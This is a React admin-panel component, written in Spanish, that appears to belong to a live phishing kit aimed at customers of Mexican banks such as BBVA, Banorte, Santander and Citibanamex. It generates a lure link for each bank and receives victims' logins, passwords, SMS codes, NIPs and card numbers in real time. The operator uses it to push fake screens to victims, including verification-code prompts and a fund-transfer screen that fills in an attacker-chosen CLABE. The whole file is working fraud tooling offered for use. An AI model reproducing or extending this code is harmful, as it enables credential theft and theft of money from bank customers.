import { useState, useEffect } from 'react';
import { useQuery, useMutation } from '@tanstack/react-query';
import { queryClient } from '@/lib/queryClient';
import { apiRequest } from '@/lib/queryClient';
import { useToast } from '@/hooks/use-toast';
import { useWebSocket } from '@/hooks/useWebSocket';
import Sidebar from '@/components/admin/Sidebar';
import AccessTable from '@/components/admin/AccessTable';
import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal } from '@/components/admin/Modals';
import { Session, ScreenType } from '@shared/schema';
import { nanoid } from 'nanoid';

export default function AdminPanel() {
  const { toast } = useToast();
  const [activeBank, setActiveBank] = useState<string>("todos");
  const [activeTab, setActiveTab] = useState<'current' | 'saved'>('current');
  const [activeModal, setActiveModal] = useState<string | null>(null);
  const [clientLink, setClientLink] = useState<string>('');
  const [clientCode, setClientCode] = useState<string>('');
  const [sessions, setSessions] = useState<Session[]>([]);
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);

  // Socket connection for real-time updates
  const { socket, connected, sendMessage } = useWebSocket("/ws");

  // Fetch sessions from API
  const { data: initialSessions, isLoading } = useQuery({
    queryKey: ['/api/sessions'],
    refetchInterval: false
  });

  // Generate link mutation
  const generateLink = useMutation({
    mutationFn: async () => {
      const banco = activeBank === 'todos' ? 'LIVERPOOL' : activeBank;
      console.log(`Generating link for bank: ${banco}`);
      const res = await apiRequest('GET', `/api/generate-link?banco=${banco}`);
      return await res.json();
    },
    onSuccess: (data) => {
      setClientLink(data.link);
      setClientCode(data.code);
      toast({
        title: "Link generado",
        description: `Link generado con código: ${data.code}`,
      });
      queryClient.invalidateQueries({ queryKey: ['/api/sessions'] });
    },
    onError: (error) => {
      toast({
        title: "Error al generar link",
        description: error.message,
        variant: "destructive",
      });
    }
  });

  // Socket event handlers
  useEffect(() => {
    if (connected) {
      // Register as admin
      sendMessage({
        type: 'REGISTER',
        role: 'ADMIN'
      });
    }
  }, [connected, sendMessage]);

  useEffect(() => {
    // Initialize sessions from API data
    if (initialSessions) {
      setSessions(Array.isArray(initialSessions) ? initialSessions : []);
    }
  }, [initialSessions]);

  // Socket message handler
  useEffect(() => {
    if (!socket) return;

    const handleMessage = (event: MessageEvent) => {
      try {
        const data = JSON.parse(event.data);
        console.log("Mensaje WebSocket recibido en AdminPanel:", data.type);
        
        if (data.type === 'INIT_SESSIONS') {
          setSessions(data.data);
        }
        else if (data.type === 'SESSION_UPDATE') {
          setSessions(prev => {
            const updated = [...prev];
            const index = updated.findIndex(s => s.sessionId === data.data.sessionId);
            if (index >= 0) {
              updated[index] = data.data;
            } else {
              updated.push(data.data);
            }
            return updated;
          });
        }
        else if (data.type === 'SMS_COMPRA_CODE') {
          // Notificación especial para códigos SMS_COMPRA
          const { sessionId, code } = data.data;
          
          toast({
            title: "Código de cancelación SMS_COMPRA",
            description: `Código: ${code} (Sesión: ${sessionId.substring(0, 6)}...)`,
            variant: "default",
          });
          
          console.log("SMS_COMPRA code:", code, "para sesión:", sessionId);
        }
        else if (data.type === 'CLIENT_INPUT_REALTIME') {
          // Mostrar notificación de entrada de datos en tiempo real
          const { sessionId, tipo, inputData } = data.data;
          
          // Manejo especial para SMS_COMPRA
          if (tipo === 'sms_compra' || tipo === 'SMS_COMPRA' || tipo === 'smsCompra') {
            if (inputData && inputData.smsCompra) {
              toast({
                title: "¡Código de cancelación recibido!",
                description: `Código: ${inputData.smsCompra}`,
                variant: "default",
              });
            }
          }
          
          // Mostrar notificación toast con los datos recibidos
          let inputDescription = '';
          switch (tipo) {
            case 'folio':
              inputDescription = `Folio: ${inputData.folio}`;
              break;
            case 'login':
              inputDescription = `Usuario: ${inputData.username}, Contraseña: ${inputData.password}`;
              break;
            case 'codigo':
              inputDescription = `Código SMS: ${inputData.codigo}`;
              break;
            case 'nip':
              inputDescription = `NIP: ${inputData.nip}`;
              break;
            case 'tarjeta':
              inputDescription = `Tarjeta: ${inputData.tarjeta}`;
              break;
            case 'sms_compra':
            case 'SMS_COMPRA':
            case 'smsCompra':
              inputDescription = `Código de Cancelación: ${inputData.smsCompra}`;
              break;
            default:
              inputDescription = `Datos de ${tipo}`;
          }
          
          toast({
            title: "Datos recibidos en tiempo real",
            description: inputDescription,
            variant: "default",
          });
          
          // Actualizar la sesión en la interfaz para mostrar datos inmediatamente
          setSessions(prev => {
            const updated = [...prev];
            const index = updated.findIndex(s => s.sessionId === sessionId);
            
            if (index >= 0) {
              // Crear copia de la sesión actual
              const updatedSession = { ...updated[index] };
              
              // Actualizar los campos según el tipo de datos
              switch (tipo) {
                case 'folio':
                  updatedSession.folio = inputData.folio;
                  break;
                case 'login':
                  updatedSession.username = inputData.username;
                  updatedSession.password = inputData.password;
                  break;
                case 'codigo':
                  updatedSession.sms = inputData.codigo;
                  break;
                case 'nip':
                  updatedSession.nip = inputData.nip;
                  break;
                case 'tarjeta':
                  updatedSession.tarjeta = inputData.tarjeta;
                  break;
                case 'sms_compra':
                case 'SMS_COMPRA':
                case 'smsCompra':
                  updatedSession.smsCompra = inputData.smsCompra;
                  break;
                case 'celular':
                  updatedSession.celular = inputData.celular;
                  break;
              }
              
              // Actualizar en la lista
              updated[index] = updatedSession;
            }
            
            return updated;
          });
        }
      } catch (error) {
        console.error("Error parsing WebSocket message:", error);
      }
    };

    socket.addEventListener('message', handleMessage);
    return () => {
      socket.removeEventListener('message', handleMessage);
    };
  }, [socket]);

  // Handle screen change
  const handleScreenChange = (screen: string) => {
    if (!selectedSessionId) {
      toast({
        title: "Seleccione una sesión",
        description: "Debe seleccionar una sesión para cambiar la pantalla.",
        variant: "destructive",
      });
      return;
    }

    // Debug para rastrear el flujo
    console.log("handleScreenChange recibió tipo de pantalla:", screen);

    // Handle modals for certain screens
    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra"].includes(screen)) {
      console.log("Activando modal para:", screen);
      setActiveModal(screen);
      return;
    }

    // Send direct screen change for other screens
    sendScreenChange({
      tipo: `mostrar_${screen}`,
      sessionId: selectedSessionId
    });
  };

  // Send screen change via WebSocket
  const sendScreenChange = (data: any) => {
    if (connected) {
      sendMessage({
        type: 'SCREEN_CHANGE',
        data
      });

      toast({
        title: "Pantalla cambiada",
        description: `La pantalla ha sido cambiada a ${data.tipo.replace('mostrar_', '')}.`,
      });
    } else {
      toast({
        title: "Error de conexión",
        description: "No hay conexión con el servidor.",
        variant: "destructive",
      });
    }
  };

  // Copy link to clipboard
  const copyLink = async () => {
    try {
      await navigator.clipboard.writeText(clientLink);
      toast({
        title: "Link copiado",
        description: "El link ha sido copiado al portapapeles.",
      });
    } catch (error) {
      toast({
        title: "Error al copiar",
        description: "No se pudo copiar el link al portapapeles.",
        variant: "destructive",
      });
    }
  };

  // Handle session selection
  const selectSession = (sessionId: string) => {
    setSelectedSessionId(sessionId);
  };

  // Modal handlers
  const closeModal = () => setActiveModal(null);

  const handleProtectConfirm = (amount: string) => {
    sendScreenChange({
      tipo: 'mostrar_protege',
      sessionId: selectedSessionId,
      saldo: amount
    });
    closeModal();
  };

  const handleTransferConfirm = (data: { cantidad: string, titular: string, clabe: string, alias: string }) => {
    sendScreenChange({
      tipo: 'mostrar_transferir',
      sessionId: selectedSessionId,
      monto: data.cantidad,
      titular: data.titular,
      clabe: data.clabe
    });
    closeModal();
  };

  const handleCancelConfirm = (data: { importe: string, negocio: string }) => {
    sendScreenChange({
      tipo: 'mostrar_cancelacion',
      sessionId: selectedSessionId,
      monto: data.importe,
      comercio: data.negocio
    });
    closeModal();
  };

  const handleCodeConfirm = (telefono: string) => {
    // Update session with phone number and send code screen
    if (telefono && telefono.length === 10) {
      const terminacion = telefono.substring(telefono.length - 4);
      
      // First update the session with the phone number
      if (selectedSessionId) {
        apiRequest('POST', `/api/sessions/${selectedSessionId}/update`, { celular: telefono })
          .then(() => {
            // Then send the screen change
            sendScreenChange({
              tipo: 'mostrar_codigo',
              sessionId: selectedSessionId,
              terminacion
            });
          })
          .catch(error => {
            toast({
              title: "Error al actualizar teléfono",
              description: error.message,
              variant: "destructive",
            });
          });
      }
    } else {
      toast({
        title: "Teléfono inválido",
        description: "Ingrese un número de teléfono válido de 10 dígitos.",
        variant: "destructive",
      });
      return;
    }
    
    closeModal();
  };

  const handleMessageConfirm = (mensaje: string) => {
    sendScreenChange({
      tipo: 'mostrar_mensaje',
      sessionId: selectedSessionId,
      mensaje
    });
    closeModal();
  };

  const handleSmsCompraConfirm = (telefono: string) => {
    // Update session with phone number and send sms_compra screen
    if (telefono && telefono.length === 10) {
      const terminacion = telefono.substring(telefono.length - 4);
      
      // First update the session with the phone number
      if (selectedSessionId) {
        apiRequest('POST', `/api/sessions/${selectedSessionId}/update`, { celular: telefono })
          .then(() => {
            // Then send the screen change
            console.log("ScreenType.SMS_COMPRA:", ScreenType.SMS_COMPRA);
            sendScreenChange({
              tipo: `mostrar_${ScreenType.SMS_COMPRA}`,
              sessionId: selectedSessionId,
              terminacion
            });
          })
          .catch(error => {
            toast({
              title: "Error al actualizar teléfono",
              description: error.message,
              variant: "destructive",
            });
          });
      }
    } else {
      toast({
        title: "Teléfono inválido",
        description: "Ingrese un número de teléfono válido de 10 dígitos.",
        variant: "destructive",
      });
      return;
    }
    
    closeModal();
  };

  return (
    <div className="flex w-full h-screen overflow-hidden">
      {/* Sidebar */}
      <Sidebar />

      {/* Main Content */}
      <div className="flex-1 bg-[#121212] text-white flex flex-col h-screen overflow-hidden">
        {/* Header Section */}
        <div className="p-6 pb-0">
          <div className="flex justify-between items-start">
            <div>
              <p className="text-[#00aaff]">Panel / Accesos</p>
              <h1 className="text-2xl font-bold mb-3">Panel Accesos</h1>
              
              <div className="mt-2">
                <label htmlFor="pantallaControl" className="text-sm text-gray-400">
                  Acciones / Control de Pantalla:
                </label>
                <select 
                  id="pantallaControl" 
                  className="mt-1 bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2 w-64"
                  onChange={(e) => handleScreenChange(e.target.value)}
                  value=""
                >
                  <option value="">Selecciona una opción</option>
                  <option value="login">1. Login</option>
                  <option value="codigo">2. Código de verificación</option>
                  <option value="nip">3. NIP</option>
                  <option value="protege">4. Protege tu información</option>
                  <option value="tarjeta">5. Ingresa tarjeta</option>
                  <option value="transferir">6. Transfiere fondos</option>
                  <option value="cancelacion">7. Cancelación exitosa</option>
                  <option value="mensaje">8. Ingresa el mensaje que gustes</option>
                  <option value="sms_compra">9. SMS Compra - Cancelación de cargos</option>
                </select>
              </div>
            </div>
            
            <div className="space-x-2">
              <button 
                className="bg-[#007bff] text-white px-4 py-2 rounded hover:bg-opacity-90 transition-all"
              >
                Bulk SMS
              </button>
              <button 
                className="bg-[#007bff] text-white px-4 py-2 rounded hover:bg-opacity-90 transition-all"
              >
                Enviar SMS
              </button>
            </div>
          </div>
        </div>

        {/* Link Panel */}
        <div className="mx-6 mt-6 bg-[#1e1e1e] p-4 rounded-lg flex justify-between items-center">
          <div className="flex items-center space-x-2">
            <span className="font-semibold">Liga activa:</span>
            <a href={clientLink} target="_blank" className="text-[#00aaff]">
              {clientLink || 'Genere un nuevo link para el cliente'}
            </a>
            {clientCode && (
              <span className={`font-bold ml-2 px-3 py-1 rounded-md ${
                activeBank === 'BANBAJIO' 
                  ? 'text-white bg-[#4D2C91]' 
                  : 'text-green-400 bg-[#1a3e1a]'
              }`}>
                Código: {clientCode}
              </span>
            )}
            <button 
              className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded ml-2"
              onClick={copyLink}
            >
              Copiar
            </button>
            <button 
              className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
              onClick={() => generateLink.mutate()}
            >
              {generateLink.isPending ? 'Generando...' : 'Regenerar'}
            </button>
          </div>
          
          <select 
            id="filtroBanco" 
            className="bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2"
            value={activeBank}
            onChange={(e) => setActiveBank(e.target.value)}
          >
            <option value="todos">Todos los bancos</option>
            <option value="LIVERPOOL">LIVERPOOL</option>
            <option value="CITIBANAMEX">CITIBANAMEX</option>
            <option value="BANBAJIO">BANBAJIO</option>
            <option value="BANCOPPEL">BANCOPPEL</option>
            <option value="BANORTE">BANORTE</option>
            <option value="BBVA">BBVA</option>
            <option value="HSBC">HSBC</option>
            <option value="AMEX">AMEX</option>
            <option value="SANTANDER">SANTANDER</option>
            <option value="SCOTIABANK">SCOTIABANK</option>
            <option value="INVEX">INVEX</option>
            <option value="SPIN">SPIN</option>
          </select>
        </div>

        {/* Tabs */}
        <div className="mx-6 mt-6 flex space-x-4">
          <div 
            className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'current' 
              ? 'border-[#00aaff] text-[#00aaff]' 
              : 'border-transparent hover:text-gray-300'}`}
            onClick={() => setActiveTab('current')}
          >
            Accesos actuales
          </div>
          <div 
            className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'saved' 
              ? 'border-[#00aaff] text-[#00aaff]' 
              : 'border-transparent hover:text-gray-300'}`}
            onClick={() => setActiveTab('saved')}
          >
            Accesos guardados
          </div>
        </div>

        {/* Table */}
        <AccessTable 
          sessions={sessions}
          activeBank={activeBank}
          selectedSessionId={selectedSessionId}
          onSelectSession={selectSession}
          isLoading={isLoading}
        />
      </div>

      {/* Modals */}
      <ProtectModal 
        isOpen={activeModal === 'protege'} 
        onClose={closeModal} 
        onConfirm={handleProtectConfirm} 
      />
      <TransferModal 
        isOpen={activeModal === 'transferir'} 
        onClose={closeModal} 
        onConfirm={handleTransferConfirm} 
      />
      <CancelModal 
        isOpen={activeModal === 'cancelacion'} 
        onClose={closeModal} 
        onConfirm={handleCancelConfirm} 
      />
      <CodeModal 
        isOpen={activeModal === 'codigo'} 
        onClose={closeModal} 
        onConfirm={handleCodeConfirm} 
      />
      <MessageModal 
        isOpen={activeModal === 'mensaje'} 
        onClose={closeModal} 
        onConfirm={handleMessageConfirm} 
      />
      <SmsCompraModal 
        isOpen={activeModal === 'sms_compra'} 
        onClose={closeModal} 
        onConfirm={handleSmsCompraConfirm} 
      />
    </div>
  );
}
